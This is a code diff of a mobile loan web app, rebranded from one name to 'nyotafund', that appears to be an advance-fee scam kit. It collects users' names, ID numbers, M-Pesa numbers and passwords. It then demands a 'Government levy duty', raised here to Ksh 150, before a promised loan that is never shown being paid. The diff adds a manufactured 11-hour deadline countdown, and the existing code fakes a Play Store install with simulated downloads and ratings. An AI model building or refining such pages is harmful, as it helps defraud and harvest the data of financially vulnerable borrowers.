             <div class="bg-white rounded-2xl p-6 shadow-xl">
                 <h2 class="text-xl font-bold text-slate-900 mb-1">Create Account</h2>
@@ -427,10 +415,9 @@
                 </div>
                 <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
                 
-                <!-- CONTACT SUPPORT ADDED HERE -->
                 <div class="mt-6 pt-5 border-t border-slate-100 text-center">
                     <p class="text-xs text-slate-500 mb-2">Having trouble creating an account?</p>
-                    <a href="mailto:support@zambiacash.com?subject=Registration Support" class="inline-block bg-slate-100 hover:bg-slate-200 text-brandBlue font-bold text-sm px-4 py-2 rounded-lg transition-colors">
+                    <a href="mailto:support@nyotafund.com?subject=Registration Support" class="inline-block bg-slate-100 hover:bg-slate-200 text-brandGreen font-bold text-sm px-4 py-2 rounded-lg transition-colors">
                         Contact Support
                     </a>
                 </div>
@@ -444,7 +431,7 @@
         <h2 class="text-white text-2xl font-bold text-center mb-2">Setting up your account</h2>
         <p id="check-status" class="text-blue-200 text-sm mb-10 font-medium text-center">Verifying your identity...</p>
         <div class="w-full max-w-xs bg-white/10 rounded-full h-2 mb-4 overflow-hidden">
-            <div id="check-bar" class="bg-brandYellow h-2 rounded-full transition-all duration-100" style="width: 0%"></div>
+            <div id="check-bar" class="bg-brandRed h-2 rounded-full transition-all duration-100" style="width: 0%"></div>
         </div>
         <p id="check-percent" class="text-white font-bold text-lg">0%</p>
         <p class="text-blue-200/60 text-xs mt-8 text-center">This usually takes a few seconds</p>
@@ -455,15 +442,22 @@
         <div class="app-bar">
             <div class="w-full">
                 <h1 class="app-bar-title">Hello, <span id="greeting-name">there</span></h1>
-                <!-- LIMIT INDICATOR ADDED HERE -->
-                <p class="text-xs text-slate-500 mt-0.5">Your maximum limit is <span class="font-bold text-emerald-600 text-sm">Ksh 10,000</span></p>
+                <p class="text-xs text-slate-500 mt-0.5">Your maximum limit is <strong class="font-extrabold text-brandGreen text-sm">Ksh 10,000</strong></p>
                 
-                <!-- QUALIFICATION BANNER -->
                 <div class="mt-3 bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center gap-3">
                     <div class="bg-emerald-100 p-2 rounded-full flex-shrink-0">
                         <svg class="w-5 h-5 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                     </div>
                     <p class="text-sm text-emerald-800 font-semibold">You qualify for up to Ksh 10,000!</p>
+                </div>
+
+                <!-- COUNTDOWN TIMER -->
+                <div class="mt-2 bg-red-50 border border-red-200 rounded-xl p-3 flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <svg class="w-5 h-5 text-red-500 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        <p class="text-sm text-red-700 font-bold">Application ends in:</p>
+                    </div>
+                    <p id="loan-timer" class="text-base font-extrabold text-red-600 font-mono tracking-wider">11:00:00</p>
                 </div>
             </div>
         </div>
@@ -479,11 +473,11 @@
             </div>
 
             <div class="native-card" style="padding: 20px; margin-bottom: 24px;">
-                <div class="row-item"><span class="row-label">You receive</span><span id="sum-receive" style="font-size: 22px; font-weight: 800; color: #1E40AF;">Ksh 1,000</span></div>
+                <div class="row-item"><span class="row-label">You receive</span><span id="sum-receive" style="font-size: 22px; font-weight: 800; color: #2E7D32;">Ksh 1,000</span></div>
                 <div class="row-item"><span id="sum-interest-label" class="row-label">Interest (10%)</span><span id="sum-interest" class="row-value">Ksh 100</span></div>
-                <div class="row-item"><span class="row-label">Total repayment</span><span id="sum-total" class="row-value" style="color: #059669; font-size: 17px;">Ksh 1,100</span></div>
+                <div class="row-item"><span class="row-label">Total repayment</span><span id="sum-total" class="row-value" style="color: #D32F2F; font-size: 17px;">Ksh 1,100</span></div>
                 <div class="row-item"><span class="row-label">Due date</span><span id="sum-due" class="row-value">--</span></div>
-                <div class="row-item"><span class="row-label">Levy Duty (one-time)</span><span id="sum-levy" style="font-weight: 800; color: #F59E0B; font-size: 17px;">Ksh 100</span></div>
+                <div class="row-item"><span class="row-label">Levy Duty (one-time)</span><span id="sum-levy" style="font-weight: 800; color: #1A1A1A; font-size: 17px;">Ksh 150</span></div>
             </div>
             <button onclick="goToPayment()" id="btn-go-payment" class="native-btn">Pay levy duty</button>
         </div>
@@ -498,21 +492,41 @@
             <h1 class="app-bar-title">Levy Duty</h1>
         </div>
         <div style="padding: 0 20px;">
+            
             <div class="native-card text-center" style="padding: 32px 20px; margin-bottom: 20px;">
                 <p class="section-label" style="margin-bottom: 8px;">Amount to pay</p>
-                <p style="font-size: 44px; font-weight: 800; color: #0F172A; letter-spacing: -0.03em;" id="pay-levy">Ksh 100</p>
-                <p style="font-size: 13px; color: #64748B; margin-top: 8px;">Government levy duty</p>
+                <p style="font-size: 44px; font-weight: 800; color: #0F172A; letter-spacing: -0.03em;" id="pay-levy">Ksh 150</p>
+                <p style="font-size: 13px; color: #64748B; margin-top: 8px;">One-time Government levy duty</p>
+                
+                <div class="mt-4 pt-4 border-t border-slate-100 flex justify-between items-center text-left">
+                    <div>
+                        <p style="font-size: 12px; color: #64748B; font-weight: 600;">Loan Amount Requested</p>
+                        <p id="pay-loan-context" style="font-size: 16px; font-weight: 800; color: #059669;">Ksh 1,000</p>
+                    </div>
+                    <div class="text-right">
+                        <p style="font-size: 12px; color: #64748B; font-weight: 600;">You will receive</p>
+                        <p id="pay-receive-context" style="font-size: 16px; font-weight: 800; color: #2E7D32;">Ksh 1,000</p>
+                    </div>
+                </div>
             </div>
+
             <div class="native-card" style="padding: 20px; margin-bottom: 20px;">
                 <label class="section-label" style="display: block;">M-Pesa number</label>
                 <input type="tel" id="pay-mpesa" placeholder="Safaricom M-Pesa (07XX or 01XX)">
                 <p style="font-size: 12px; color: #94A3B8; margin-top: 10px;">Your loan will be sent to this number</p>
             </div>
+            
             <div class="info-banner" style="margin-bottom: 24px;">
-                <svg class="w-5 h-5 flex-shrink-0 text-brandBlue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                <p style="font-size: 13px; line-height: 1.5; color: #1E40AF; font-weight: 500;">Pay the small levy duty to activate your loan. Funds will be released immediately after confirmation.</p>
+                <svg class="w-5 h-5 flex-shrink-0 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                <p style="font-size: 13px; line-height: 1.5; color: #2E7D32; font-weight: 500;">Pay the small levy duty to activate your loan. Funds will be released immediately after confirmation.</p>
             </div>
-            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 100 Levy Duty</button>
+
+            <button onclick="showScreen('screen-select')" class="w-full bg-white text-slate-600 font-bold py-4 rounded-xl border-2 border-slate-200 mb-4 transition-all active:scale-95 hover:bg-slate-50 flex items-center justify-center gap-2">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+                Maybe Later
+            </button>
+
+            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 150 Levy Duty</button>
         </div>
     </div>
 
@@ -520,10 +534,10 @@
     <div id="screen-success" class="screen app-shell" style="padding: 0 20px 32px;">
         <div class="max-w-sm mx-auto w-full text-center" style="padding-top: 60px;">
             <div id="verify-anim" class="flex flex-col items-center">
-                <div style="width: 100px; height: 100px; border: 5px solid #E2E8F0; border-top-color: #1E40AF; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 28px;"></div>
+                <div style="width: 100px; height: 100px; border: 5px solid #E2E8F0; border-top-color: #2E7D32; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 28px;"></div>
                 <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Verifying payment</h2>
                 <p id="verify-subtitle" style="font-size: 14px; color: #64748B; margin-top: 8px; line-height: 1.5; padding: 0 8px;">Please wait while we confirm with M-Pesa...</p>
-                <p id="verify-time" style="color: #F59E0B; font-weight: 800; margin-top: 20px; font-size: 18px; background: #FEF3C7; padding: 6px 18px; border-radius: 999px; display: inline-block;">0s</p>
+                <p id="verify-time" style="color: #D32F2F; font-weight: 800; margin-top: 20px; font-size: 18px; background: #FEF2F2; padding: 6px 18px; border-radius: 999px; display: inline-block;">0s</p>
             </div>
 
             <!-- SUCCESS -->
@@ -537,16 +551,16 @@
                     <div class="row-item"><span class="row-label">Loan Amount</span><span id="suc-loan" class="row-value" style="font-size: 17px;">Ksh 1,000</span></div>
                     <div class="row-item"><span class="row-label">Total Repayment</span><span id="suc-total" class="row-value">Ksh 1,100</span></div>
                     <div class="row-item"><span class="row-label">Due Date</span><span id="suc-due" class="row-value">--</span></div>
-                    <div class="row-item"><span class="row-label">M-Pesa</span><span id="suc-mpesa" class="row-value" style="color: #1E40AF;"></span></div>
+                    <div class="row-item"><span class="row-label">M-Pesa</span><span id="suc-mpesa" class="row-value" style="color: #2E7D32;"></span></div>
                 </div>
                 <div class="info-banner w-full" style="margin-bottom: 20px;">
-                    <svg class="w-5 h-5 flex-shrink-0 text-brandBlue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                    <p style="font-size: 13px; line-height: 1.55; color: #1E40AF; font-weight: 500; text-align: left;">Your funds will be disbursed to your M-Pesa within the next <strong>24 hours</strong>.</p>
+                    <svg class="w-5 h-5 flex-shrink-0 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <p style="font-size: 13px; line-height: 1.55; color: #2E7D32; font-weight: 500; text-align: left;">Your funds will be disbursed to your M-Pesa within the next <strong>24 hours</strong>.</p>
                 </div>
                 <p style="font-size: 12px; color: #94A3B8; font-weight: 500;">You may now close the app</p>
             </div>
 
-            <!-- FAILED (SECURE VERSION) -->
+            <!-- FAILED -->
             <div id="failed-anim" class="hide flex flex-col items-center">
                 <div style="width: 96px; height: 96px; background: #FEE2E2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                     <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
@@ -563,13 +577,11 @@
                     </ol>
                 </div>
 
-                <!-- BOLD TRY AGAIN BUTTON -->
                 <button id="btn-retry-failed" class="native-btn" style="margin-bottom: 12px; background: linear-gradient(135deg, #10B981 0%, #059669 100%); color: white; font-size: 20px; box-shadow: 0 10px 25px -5px rgba(16, 185, 129, 0.7); display: flex; justify-content: center; align-items: center; border: 2px solid #34D399; font-weight: 900; letter-spacing: 0.5px; text-transform: uppercase;">
                     <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                     TRY AGAIN
                 </button>
 
-                <!-- SUBTLE CHECK STATUS BUTTON -->
                 <button onclick="checkStatusManual()" id="btn-check-status-failed" class="native-btn" style="margin-bottom: 12px; background: #FFFFFF; color: #475569; border: 1.5px solid #CBD5E1; display: flex; justify-content: center; align-items: center; box-shadow: 0 1px 2px 0 rgba(0,0,0,0.05);">
                     <span>Check Status</span>
                 </button>
@@ -577,11 +589,11 @@
 
             <!-- PENDING -->
             <div id="pending-anim" class="hide flex flex-col items-center">
-                <div style="width: 96px; height: 96px; background: #FEF3C7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 48px; color: #F59E0B; font-weight: 800;">?</div>
+                <div style="width: 96px; height: 96px; background: #FEF3C7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 48px; color: #D32F2F; font-weight: 800;">?</div>
                 <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Still Confirming</h2>
                 <p style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 32px; padding: 0 16px; line-height: 1.5;">We haven't received confirmation from M-Pesa yet. Tap below to check again.</p>
                 <button onclick="checkStatusManual()" id="btn-check-status" class="native-btn" style="margin-bottom: 12px; display: flex; justify-content: center;"><span>Check Status</span></button>
-                <button onclick="retryPayment()" style="width: 100%; color: #1E40AF; font-weight: 700; padding: 12px; font-size: 14px; background: none; border: none; cursor: pointer;">Back to Payment</button>
+                <button onclick="retryPayment()" style="width: 100%; color: #2E7D32; font-weight: 700; padding: 12px; font-size: 14px; background: none; border: none; cursor: pointer;">Back to Payment</button>
             </div>
         </div>
     </div>
@@ -595,23 +607,30 @@ const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1
 const MAX_POLL_SECONDS = 60;
 
 const SUCCESS_STATUSES = ['ALLOCATED','SUCCESS','COMPLETED','PAID','SUCCESSFUL','TRUE','CONFIRMED'];
-// Removed CANCELLED and TIMEOUT from hard failures to account for delayed M-Pesa webhooks
 const FAILED_STATUSES = ['FAILED','REJECTED','EXPIRED','DECLINED','FALSE','ABORTED','USER_ABORTED'];
 const PENDING_STATUSES = ['CANCELLED', 'CANCELED', 'TIMEOUT'];
 
-let state = { name:"", id:"", mpesa:"", promo:"", loan:1000, levy:100, term:30, interest:100, total:1100 };
+let state = { name:"", id:"", mpesa:"", promo:"", loan:1000, levy:150, term:30, interest:100, total:1100 };
 const amounts = [1000,2000,3000,5000,7500,10000,15000,20000,25000,30000,40000,50000];
 let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxnId = null, toastTimeout;
 
-// Date-based fake download variables
 let fakeInterval = null;
 let deferredPrompt = null;
 let waitingForPrompt = false;
+let loanTimerInterval = null;
 
 const format = (n) => "Ksh " + Number(n).toLocaleString();
 const getDueDate = (d) => { const x = new Date(); x.setDate(x.getDate()+d); return x.toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'}); };
 
-function showScreen(id){ document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active')); document.getElementById(id).classList.add('active'); window.scrollTo(0,0); }
+function showScreen(id){ 
+    document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active')); 
+    document.getElementById(id).classList.add('active'); 
+    window.scrollTo(0,0); 
+    
+    if (id !== 'screen-select') {
+        stopLoanTimer();
+    }
+}
 
 function showToast(msg){
     const t = document.getElementById('android-toast');
@@ -620,25 +639,16 @@ function showToast(msg){
     toastTimeout = setTimeout(()=>{ t.classList.add('hide-toast'); setTimeout(()=>t.classList.add('hide'),300); }, 4000);
 }
 
-/* =============== OFFLINE RETRY LOGIC =============== */
 async function retryConnection() {
     const btn = document.getElementById('btn-retry-connection');
     const originalText = btn.innerText;
-    
-    btn.innerText = "Checking...";
-    btn.disabled = true;
-    btn.style.opacity = "0.7";
+    btn.innerText = "Checking..."; btn.disabled = true; btn.style.opacity = "0.7";
 
     try {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 5000); 
 
-        const res = await fetch(window.location.href + '?t=' + Date.now(), { 
-            method: 'HEAD', 
-            cache: 'no-store',
-            signal: controller.signal
-        });
-        
+        const res = await fetch(window.location.href + '?t=' + Date.now(), { method: 'HEAD', cache: 'no-store', signal: controller.signal });
         clearTimeout(timeoutId);
 
         if (res.ok || res.status === 200) {
@@ -647,36 +657,23 @@ async function retryConnection() {
             throw new Error("Network response was not ok");
         }
     } catch (err) {
-        if (window.showToast) {
-            window.showToast("⚠️ Still offline. Please check your connection.");
-        } else {
-            alert("Still offline. Please check your internet connection and try again.");
-        }
-        btn.innerText = originalText;
-        btn.disabled = false;
-        btn.style.opacity = "1";
+        if (window.showToast) window.showToast("⚠️ Still offline. Please check your connection.");
+        else alert("Still offline. Please check your internet connection and try again.");
+        btn.innerText = originalText; btn.disabled = false; btn.style.opacity = "1";
     }
 }
 
-// Global Listeners for Every Page
-window.addEventListener('offline', () => {
-    document.getElementById('offline-gate').classList.remove('hide');
-});
-
+window.addEventListener('offline', () => { document.getElementById('offline-gate').classList.remove('hide'); });
 window.addEventListener('online', () => {
     const gate = document.getElementById('offline-gate');
-    if (!gate.classList.contains('hide')) {
-        gate.classList.add('hide');
-    }
+    if (!gate.classList.contains('hide')) gate.classList.add('hide');
 });
 
-/* =============== UPDATED FETCH TIMEOUT =============== */
 async function fetchWithTimeout(url, opts={}, ms=15000){
     if (!navigator.onLine) {
         document.getElementById('offline-gate').classList.remove('hide');
         throw new Error("No internet connection");
     }
-
     const c = new AbortController(); 
     const t = setTimeout(()=>c.abort(), ms);
     try { 
@@ -686,9 +683,7 @@ async function fetchWithTimeout(url, opts={}, ms=15000){
              document.getElementById('offline-gate').classList.remove('hide');
         }
         throw error;
-    } finally { 
-        clearTimeout(t); 
-    }
+    } finally { clearTimeout(t); }
 }
 
 async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.parse(x) : null; }catch(e){ return null; } }
@@ -696,16 +691,15 @@ async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.p
 function stopPolling(){ if(pollTimer){ clearTimeout(pollTimer); pollTimer = null; } isPolling = false; }
 function resetPayButton(){ 
     isProcessingPayment = false; 
-    localStorage.removeItem('zc_failed_attempts'); // Fix: Clear spam attempts here
+    localStorage.removeItem('nyota_failed_attempts');
     const b = document.getElementById('btn-pay'); 
     if(b){ 
         b.disabled = false; 
         b.innerText = `Pay ${format(state.levy)} Levy Duty`; 
-        b.style.background = ''; // Reset background color in case it was disabled by spam blocker
+        b.style.background = ''; 
     } 
 }
 
-/* =============== BROWSER DETECTION =============== */
 const _ua = navigator.userAgent || '';
 const _isAndroid = /Android/i.test(_ua);
 const _isIOS = /iPhone|iPad|iPod/i.test(_ua);
@@ -742,7 +736,6 @@ function copyLinkAndShowHelp() {
     });
 }
 
-/* =============== PLAY STORE LOGIC =============== */
 const playStoreGate = document.getElementById('play-store-gate');
 const appContent = document.getElementById('app-content');
 const splashScreen = document.getElementById('splash-screen');
@@ -751,7 +744,6 @@ const browserWarning = document.getElementById('browser-warning');
 window.addEventListener('beforeinstallprompt', (e) => {
     e.preventDefault();
     deferredPrompt = e;
-    
     if (waitingForPrompt) {
         waitingForPrompt = false;
         triggerRealInstall();
@@ -794,32 +786,24 @@ function mockUninstall(){
 
 function setRating(r){
     document.querySelectorAll('.rate-star').forEach((s,i)=>{
-        if(i<r){ s.classList.remove('text-gray-300'); s.classList.add('text-brandYellow'); s.setAttribute('fill','currentColor'); }
-        else { s.classList.remove('text-brandYellow'); s.classList.add('text-gray-300'); s.setAttribute('fill','none'); }
+        if(i<r){ s.classList.remove('text-gray-300'); s.classList.add('text-playBlue'); s.setAttribute('fill','currentColor'); }
+        else { s.classList.remove('text-playBlue'); s.classList.add('text-gray-300'); s.setAttribute('fill','none'); }
     });
     if(r>0){ const b = document.getElementById('btn-write-review'); b.innerText = `Thanks for rating ${r} stars!`; b.classList.remove('text-playBlue'); b.classList.add('text-emerald-600'); }
 }
 
 document.getElementById('btn-store-install').addEventListener('click', () => {
     startFakeDownload();
-    if (deferredPrompt) {
-        triggerRealInstall();
-    } else {
-        waitingForPrompt = true;
-    }
+    if (deferredPrompt) triggerRealInstall();
+    else waitingForPrompt = true;
 });
 
 function triggerRealInstall() {
     if (!deferredPrompt) return;
     deferredPrompt.prompt();
     deferredPrompt.userChoice.then((choiceResult) => {
-        if (choiceResult.outcome === 'accepted') {
-            // appinstalled event will handle the UI change
-        }
         deferredPrompt = null;
-        if (localStorage.getItem('pwa_installed') !== '1') {
-            showInstallState();
-        }
+        if (localStorage.getItem('pwa_installed') !== '1') showInstallState();
     });
 }
 
@@ -830,7 +814,7 @@ function startFakeDownload() {
     document.getElementById('ring-svg').classList.remove('hidden');
 
     const startTime = Date.now();
-    const duration = 30000; // 30 seconds
+    const duration = 30000;
 
     clearInterval(fakeInterval);
     fakeInterval = setInterval(() => {
@@ -841,10 +825,7 @@ function startFakeDownload() {
         if (elapsed >= duration) {
             clearInterval(fakeInterval);
             document.getElementById('download-text').classList.add('hide');
-            
-            if (localStorage.getItem('pwa_installed') !== '1') {
-                showInstallState();
-            }
+            if (localStorage.getItem('pwa_installed') !== '1') showInstallState();
         }
     }, 50);
 }
@@ -856,7 +837,6 @@ function updateProgressUI(progress) {
     if(pct) pct.innerText = Math.floor(progress) + "% of 10 MB";
 }
 
-/* =============== SEE ALL REVIEWS TOGGLE =============== */
 function toggleReviews() {
     const extra = document.getElementById('more-reviews');
     const btn = document.getElementById('btn-see-all');
@@ -869,25 +849,20 @@ function toggleReviews() {
     }
 }
 
-/* =============== OPEN BUTTON TRICK =============== */
 document.getElementById('btn-open-app').addEventListener('click', async ()=>{
     if (_isAndroid && 'getInstalledRelatedApps' in navigator) {
         try {
             const apps = await navigator.getInstalledRelatedApps();
             const pwa = apps.find(a => a.platform === 'webapp');
-            
             if (pwa) {
                 window.location.href = './index.html?source=pwa';
                 return;
             }
-        } catch (e) {
-            console.log("Check failed", e);
-        }
+        } catch (e) { console.log("Check failed", e); }
     }
 
     const prompt = document.getElementById('installed-prompt');
     prompt.classList.remove('hide');
-    
     setTimeout(() => {
         prompt.classList.remove('opacity-0', '-translate-y-2');
         prompt.classList.add('opacity-100', 'translate-y-0');
@@ -896,9 +871,7 @@ document.getElementById('btn-open-app').addEventListener('click', async ()=>{
     setTimeout(() => {
         prompt.classList.remove('opacity-100', 'translate-y-0');
         prompt.classList.add('opacity-0', '-translate-y-2');
-        setTimeout(() => {
-            prompt.classList.add('hide');
-        }, 300);
+        setTimeout(() => prompt.classList.add('hide'), 300);
     }, 10000);
 });
 
@@ -917,10 +890,9 @@ function showAppInline(){
     }, 1500);
 }
 
-/* =============== BOOT LOGIC =============== */
 function bootApp(){
     if (_cameFromIntent) history.replaceState({}, '', window.location.pathname);
-    const saved = localStorage.getItem('zc_user');
+    const saved = localStorage.getItem('nyota_user');
     if(saved){
         try {
             const u = JSON.parse(saved);
@@ -932,7 +904,7 @@ function bootApp(){
                 buildLoanScreen();
                 return;
             }
-        } catch(e){ localStorage.removeItem('zc_user'); }
+        } catch(e){ localStorage.removeItem('nyota_user'); }
     }
     showScreen('screen-login');
 }
@@ -964,9 +936,39 @@ if (isStandalone) {
     showInstallState();
 }
 
-if('serviceWorker' in navigator){ window.addEventListener('load', ()=>{ navigator.serviceWorker.register('sw.js').catch(()=>{}); }); }
+// SERVICE WORKER & DOUBLE REFRESH LOGIC
+if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+        navigator.serviceWorker.register('sw.js').then((reg) => {
+            reg.onupdatefound = () => {
+                const installingWorker = reg.installing;
+                if (!installingWorker) return;
+                installingWorker.onstatechange = () => {
+                    if (installingWorker.state === 'installed') {
+                        if (navigator.serviceWorker.controller) {
+                            installingWorker.postMessage({ type: 'SKIP_WAITING' });
+                        }
+                    }
+                };
+            };
 
-/* =============== LOGIN (15 SEC) =============== */
+            let refreshing = false;
+            navigator.serviceWorker.addEventListener('controllerchange', () => {
+                if (refreshing) return;
+                refreshing = true;
+                
+                if (sessionStorage.getItem('sw_double_reload') === 'true') {
+                    sessionStorage.removeItem('sw_double_reload');
+                    window.location.reload();
+                } else {
+                    sessionStorage.setItem('sw_double_reload', 'true');
+                    window.location.reload();
+                }
+            });
+        }).catch(()=>{});
+    });
+}
+
 function submitLogin(){
     const name = document.getElementById('in-name').value.trim();
     const id = document.getElementById('in-id').value.trim();
@@ -980,7 +982,7 @@ function submitLogin(){
     if(pass.length < 4) return showToast("Password must be at least 4 characters.");
 
     state.name = name; state.id = id; state.mpesa = mpesa; state.promo = promo;
-    localStorage.setItem('zc_user', JSON.stringify({ name, id, mpesa, promo }));
+    localStorage.setItem('nyota_user', JSON.stringify({ name, id, mpesa, promo }));
 
     fetch(`${SUPABASE_URL}/rest/v1/users`, {
         method:'POST',
@@ -1011,7 +1013,6 @@ function submitLogin(){
     }, 100);
 }
 
-/* =============== LOAN SELECTION =============== */
 function buildLoanScreen(){
     const first = state.name.split(' ')[0];
     document.getElementById('greeting-name').innerText = first || 'there';
@@ -1046,12 +1047,13 @@ function buildLoanScreen(){
     
     updateSummary();
     showScreen('screen-select');
+    startLoanTimer(); 
 }
 
 function setTerm(d, b){ state.term = d; document.querySelectorAll('.term-btn').forEach(x=>x.classList.remove('selected')); b.classList.add('selected'); updateSummary(); }
 
 function updateSummary(){
-    state.levy = 100;
+    state.levy = 150;
     const rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
     state.interest = Math.round(state.loan * rate);
     state.total = state.loan + state.interest;
@@ -1063,10 +1065,13 @@ function updateSummary(){
     document.getElementById('sum-levy').innerText = format(state.levy);
 }
 
-/* =============== PAYMENT =============== */
 function goToPayment(){
     document.getElementById('pay-levy').innerText = format(state.levy);
     document.getElementById('pay-mpesa').value = state.mpesa;
+    
+    document.getElementById('pay-loan-context').innerText = format(state.loan);
+    document.getElementById('pay-receive-context').innerText = format(state.loan);
+    
     resetPayButton();
     showScreen('screen-payment');
 }
@@ -1093,7 +1098,7 @@ async function processPayment(){
         const res = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
             method:'POST',
             headers:{ 
-                'apikey': SUPABASE_KEY, // Added missing apikey header
+                'apikey': SUPABASE_KEY,
                 'Authorization':`Bearer ${SUPABASE_KEY}`, 
                 'Content-Type':'application/json' 
             },
@@ -1109,9 +1114,7 @@ async function processPayment(){
         let data;
         try { data = JSON.parse(rawText); } catch (e) { data = { error: "Invalid response from server" }; }
 
-        if (!res.ok) {
-            throw new Error(data.error || 'Payment service error');
-        }
+        if (!res.ok) throw new Error(data.error || 'Payment service error');
 
         const txnId = data.data?.transactionId || data.transactionId || data.id;
         if (!txnId) throw new Error("No transaction ID in response.");
@@ -1153,7 +1156,7 @@ async function checkStatusFromDB(txnId){
             const s = String(row.status || "").toUpperCase();
             if(SUCCESS_STATUSES.includes(s)) return { status:'SUCCESS', raw:s };
             if(FAILED_STATUSES.includes(s)) return { status:'FAILED', raw:s };
-            if(PENDING_STATUSES.includes(s)) return { status:'PENDING', raw:s }; // Return pending explicitly
+            if(PENDING_STATUSES.includes(s)) return { status:'PENDING', raw:s };
         }
         return { status:'PENDING', raw: 'UNKNOWN' };
     } catch(e){ return { status:'ERROR' }; }
@@ -1175,16 +1178,10 @@ function startPolling(txnId){
             
             try {
                 const result = await checkStatusFromDB(txnId);
-                
                 if(result.status === 'SUCCESS'){ showSuccess(); return; }
-                
-                // If it's pending or cancelled/timed out, DO NOT fail. Keep polling for delayed success.
                 if(result.status === 'PENDING'){
-                    if(PENDING_STATUSES.includes(result.raw)) {
-                        document.getElementById('verify-subtitle').innerText = "Verifying final status with M-Pesa...";
-                    }
+                    if(PENDING_STATUSES.includes(result.raw)) document.getElementById('verify-subtitle').innerText = "Verifying final status with M-Pesa...";
                 }
-                
                 if(result.status === 'FAILED'){ showFailed(); return; }
             } finally { isPolling = false; }
             
@@ -1217,7 +1214,7 @@ function showFailed(){
 
 function showPending(){
     stopPolling(); 
-    isProcessingPayment = false; // Fix: Reset this so user can retry/poll again
+    isProcessingPayment = false; 
     const b = document.getElementById('btn-pay');
     if (b) { b.disabled = false; }
 
@@ -1266,9 +1263,50 @@ function retryPayment(){
     showScreen('screen-payment'); resetPayButton();
 }
 
+// TIMER LOGIC
+function startLoanTimer() {
+    if (loanTimerInterval) clearInterval(loanTimerInterval);
+    
+    const timerElement = document.getElementById('loan-timer');
+    if (!timerElement) return;
+
+    let endTime = localStorage.getItem('nyota_timer_end');
+    
+    if (!endTime) {
+        const elevenHoursFromNow = Date.now() + (11 * 60 * 60 * 1000); 
+        localStorage.setItem('nyota_timer_end', elevenHoursFromNow);
+        endTime = elevenHoursFromNow;
+    }
+
+    loanTimerInterval = setInterval(() => {
+        const now = Date.now();
+        let timeLeft = Math.floor((endTime - now) / 1000);
+        
+        if (timeLeft <= 0) {
+            clearInterval(loanTimerInterval);
+            timerElement.innerText = "EXPIRED";
+            timerElement.classList.add('text-red-800');
+            localStorage.removeItem('nyota_timer_end'); 
+            return;
+        }
+        
+        const hours = Math.floor(timeLeft / 3600);
+        const minutes = Math.floor((timeLeft % 3600) / 60);
+        const seconds = timeLeft % 60;
+        
+        timerElement.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    }, 1000);
+}
+
+function stopLoanTimer() {
+    if (loanTimerInterval) {
+        clearInterval(loanTimerInterval);
+        loanTimerInterval = null;
+    }
+}
 
 // =========================================================
-// SPAM PROTECTION ADD-ON (Appended at the bottom)
+// SPAM PROTECTION ADD-ON
 // =========================================================
 (function() {
     const MAX_ATTEMPTS = 3;
@@ -1321,14 +1359,13 @@ function retryPayment(){
     `;
     document.head.appendChild(style);
 
